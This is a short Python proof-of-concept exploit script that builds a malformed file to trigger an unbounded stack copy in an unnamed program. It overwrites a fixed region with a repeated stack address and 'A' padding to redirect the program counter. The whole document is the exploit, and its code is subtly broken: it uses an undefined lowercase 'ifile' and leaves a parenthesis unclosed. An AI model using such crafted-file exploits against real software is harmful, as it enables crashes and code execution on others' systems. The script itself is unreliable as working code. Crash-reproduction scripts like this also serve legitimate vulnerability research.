#!/usr/bin/python3
""" magic-082819.py
Exploit an unbounded copy onto the stack; reliable death @ pc=0x41414140.
"""
from sys import argv

IFILE = argv[1]
OFILE = ifile + ".dirty"

# Some magic offsets into the file
LO_MARK     = 0x0420
HI_MARK     = 0x0430
PLD_LEN     = 0x1000
OFF_BASE    = 0x3b48
OFF_TAIL    = OFF_BASE + PLD_LEN
STACK_ADDR  = b'\x0c\xb4\x81\x40'

# Read a clean file
with open(IFILE, "rb") as f: 
    data = bytearray(f.read())

# Paint this stack address across this region in the file
payload = bytearray(STACK_ADDR * (PLD_LEN // len(STACK_ADDR))

# Whatever is getting dereferenced seems to live at HI_MARK
payload[HI_MARK:PLD_LEN] = b'A' * (PLD_LEN - HI_MARK)

# Write a dirty file
data[OFF_BASE:OFF_TAIL] = payload
with open(OFILE, "wb") as f: 
    f.write(data)
